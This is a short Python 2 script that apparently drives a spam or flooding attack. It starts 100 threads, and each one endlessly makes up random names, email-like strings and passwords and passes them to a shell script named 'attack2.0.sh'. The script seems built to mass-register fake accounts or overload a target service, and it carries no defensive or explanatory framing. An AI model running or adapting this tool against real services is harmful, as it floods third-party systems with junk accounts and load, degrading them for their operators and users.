import string
import random
import os
from threading import Thread

class Process(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        while True:
            prenom = id_generator(random.randint(4, 8))
            nom = id_generator(random.randint(4, 8))
            password = id_generator(random.randint(4, 8))
            mail = id_generator(random.randint(4, 8)) + '.' + id_generator(random.randint(4, 8))
            command = "sh attack2.0.sh " + prenom + " " + mail + " " + nom + " " + password
            os.system(command)
            print "\n" + mail

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

i = 0
while i < 100:
    thread_1 = Process()
    thread_1.start()
    i = i + 1
